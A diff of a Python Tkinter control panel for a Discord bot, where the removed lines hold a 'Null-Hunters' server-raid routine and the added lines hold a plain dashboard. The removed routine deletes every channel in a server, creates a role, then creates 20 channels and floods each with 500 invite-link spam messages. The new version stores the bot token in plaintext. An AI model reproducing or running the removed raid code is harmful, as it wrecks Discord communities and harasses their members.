@@ -1,91 +1,165 @@
 import tkinter as tk
-from tkinter import messagebox
+from tkinter import ttk, messagebox
+import threading
 import discord
-from discord.ext import commands, tasks
-from PIL import Image, ImageTk  # Necesario para trabajar con imágenes en Tkinter
+import json
+import queue
+import asyncio
 
-# Crear la ventana principal
-root = tk.Tk()
-root.title("Null-Hunters Bot Control Panel")
+# =========================
+# CONFIG
+# =========================
+CONFIG_FILE = "config.json"
 
-# Configuración de la ventana
-root.geometry("600x400")  # Tamaño de la ventana
+def load_config():
+    try:
+        with open(CONFIG_FILE, "r") as f:
+            return json.load(f)
+    except:
+        return {}
 
-# Cargar la imagen de fondo
-bg_image = Image.open("fondo.png")  # Asegúrate de que el archivo se llame "fondo.png" o el nombre correcto
-bg_image = bg_image.resize((600, 400), Image.ANTIALIAS)  # Redimensionar la imagen para que se ajuste
-bg_photo = ImageTk.PhotoImage(bg_image)
+def save_config(data):
+    with open(CONFIG_FILE, "w") as f:
+        json.dump(data, f, indent=4)
 
-# Crear un label para la imagen de fondo
-bg_label = tk.Label(root, image=bg_photo)
-bg_label.place(relwidth=1, relheight=1)  # Esto hace que la imagen ocupe todo el fondo
+config = load_config()
 
-# Función para iniciar sesión con el token
-def start_bot():
-    token = entry_token.get()
-    bot_id = entry_bot_id.get()
+# =========================
+# LOG SYSTEM
+# =========================
+log_queue = queue.Queue()
 
-    if not token or not bot_id:
-        messagebox.showerror("Error", "Ambos campos son requeridos")
+def log(text):
+    log_queue.put(text)
+
+def update_logs():
+    while not log_queue.empty():
+        msg = log_queue.get()
+        log_box.insert(tk.END, msg + "\n")
+        log_box.see(tk.END)
+    root.after(200, update_logs)
+
+# =========================
+# DISCORD BOT
+# =========================
+intents = discord.Intents.default()
+client = discord.Client(intents=intents)
+
+bot_token = None
+target_channel_id = None
+
+
+@client.event
+async def on_ready():
+    log(f"✅ Conectado como {client.user}")
+
+
+def run_bot():
+    try:
+        client.run(bot_token)
+    except Exception as e:
+        log(f"❌ Error bot: {e}")
+
+
+# =========================
+# BOT ACTIONS (BUTTONS)
+# =========================
+def send_message():
+    if not target_channel_id:
+        messagebox.showerror("Error", "Configura Channel ID")
         return
 
-    # Conectar al bot de Discord usando discord.py
-    client = commands.Bot(command_prefix="!")
+    message = entry_message.get()
 
-    @client.event
-    async def on_ready():
-        print(f'Bot conectado como {client.user}')
-        messagebox.showinfo("Conexión exitosa", f'Conectado como {client.user}')
+    async def task():
+        channel = client.get_channel(int(target_channel_id))
+        if channel:
+            await channel.send(message)
+            log("📨 Mensaje enviado")
+        else:
+            log("❌ Canal no encontrado")
 
-        # Obtener el servidor donde el bot está presente
-        guild = client.guilds[0]  # Asumiendo que el bot está en solo un servidor
-        invite_link = "https://discord.gg/Rfs9N3fya4"
-        
-        # Borrar todos los canales existentes
-        for channel in guild.channels:
-            try:
-                await channel.delete()
-                print(f"Canal {channel.name} borrado.")
-            except discord.Forbidden:
-                print(f"No tengo permisos para borrar el canal {channel.name}")
-        
-        # Crear el rol con fuente rara
-        role_name = "𝙽̷𝚄̷𝙻̷𝙻̷-𝙷̷𝚄̷𝙽̷𝚃̷𝙴̷𝚁̷𝚂̷"
-        role = await guild.create_role(name=role_name, color=discord.Color.green())
+    asyncio.run_coroutine_threadsafe(task(), client.loop)
 
-        # Crear la categoría
-        category = await guild.create_category("NULL-HUNTERS IS HERE")
 
-        # Crear hasta 20 canales y mandar mensajes
-        for i in range(1, 21):  # Crear hasta 20 canales
-            channel = await guild.create_text_channel(f"null-hunters-channel-{i}", category=category)
-            # Enviar 500 mensajes en cada canal
-            for _ in range(500):  # Enviar hasta 500 mensajes en cada canal
-                await channel.send(f"{invite_link} 𝙽̷𝚄̷𝙻̷𝙻̷-𝙷̷𝚄̷𝙽̷𝚃̷𝙴̷𝚁̷𝚂̷ 𝙸̷𝚂̷ 𝙸̷𝙽̷ 𝚈̷𝙾̷𝚄̷𝚁̷ 𝚂̷𝙴̷𝚁̷𝚅̷𝙴̷𝚁̷")
+def ping_test():
+    async def task():
+        for guild in client.guilds:
+            log(f"📡 Servidor: {guild.name}")
 
-        print("Canales creados y mensajes enviados.")
+    asyncio.run_coroutine_threadsafe(task(), client.loop)
 
-    try:
-        client.run(token)
-    except discord.LoginFailure:
-        messagebox.showerror("Error", "Token inválido o fallo en la conexión")
 
-# Crear campos de entrada
-tk.Label(root, text="Bot Token", bg='white').pack(pady=5)
-entry_token = tk.Entry(root, width=30)
-entry_token.pack(pady=5)
+# =========================
+# START BOT
+# =========================
+def start_bot():
+    global bot_token, target_channel_id
 
-tk.Label(root, text="Bot ID", bg='white').pack(pady=5)
-entry_bot_id = tk.Entry(root, width=30)
-entry_bot_id.pack(pady=5)
+    bot_token = entry_token.get().strip()
+    target_channel_id = entry_channel.get().strip()
 
-# Botón para iniciar sesión
-button_start = tk.Button(root, text="Iniciar Bot", command=start_bot)
-button_start.pack(pady=20)
+    if not bot_token:
+        messagebox.showerror("Error", "Token requerido")
+        return
 
-# Texto "Creado por NULL-HUNTERS" en la parte inferior
-footer_label = tk.Label(root, text="Creado por NULL-HUNTERS", bg='black', fg='white', font=('Arial', 10))
-footer_label.place(relx=0.5, rely=0.95, anchor='center')  # Posiciona el texto en la parte inferior centrado
+    config["token"] = bot_token
+    config["channel_id"] = target_channel_id
+    save_config(config)
 
-# Ejecutar la ventana
+    threading.Thread(target=run_bot, daemon=True).start()
+    log("🚀 Iniciando bot...")
+
+
+# =========================
+# GUI (DASHBOARD)
+# =========================
+root = tk.Tk()
+root.title("Control Center Bot Dashboard")
+root.geometry("700x500")
+root.configure(bg="#1e1e2e")
+
+style = ttk.Style()
+style.theme_use("clam")
+
+# ===== TOP FRAME =====
+top = ttk.Frame(root)
+top.pack(fill="x", padx=10, pady=10)
+
+ttk.Label(top, text="Bot Token").grid(row=0, column=0)
+entry_token = ttk.Entry(top, width=40)
+entry_token.grid(row=0, column=1)
+
+ttk.Label(top, text="Channel ID").grid(row=1, column=0)
+entry_channel = ttk.Entry(top, width=40)
+entry_channel.grid(row=1, column=1)
+
+# load config
+if "token" in config:
+    entry_token.insert(0, config["token"])
+if "channel_id" in config:
+    entry_channel.insert(0, config["channel_id"])
+
+ttk.Button(top, text="Start Bot", command=start_bot).grid(row=2, column=1, pady=5)
+
+# ===== BUTTON PANEL =====
+btn_frame = ttk.LabelFrame(root, text="Control Panel")
+btn_frame.pack(fill="x", padx=10, pady=10)
+
+entry_message = ttk.Entry(btn_frame, width=50)
+entry_message.grid(row=0, column=0, padx=5, pady=5)
+
+ttk.Button(btn_frame, text="Send Message", command=send_message).grid(row=0, column=1, padx=5)
+ttk.Button(btn_frame, text="Ping Servers", command=ping_test).grid(row=0, column=2, padx=5)
+
+# ===== LOGS =====
+log_frame = ttk.LabelFrame(root, text="Live Logs")
+log_frame.pack(fill="both", expand=True, padx=10, pady=10)
+
+log_box = tk.Listbox(log_frame, bg="black", fg="lime")
+log_box.pack(fill="both", expand=True)
+
+# start log updater
+update_logs()
+
 root.mainloop()
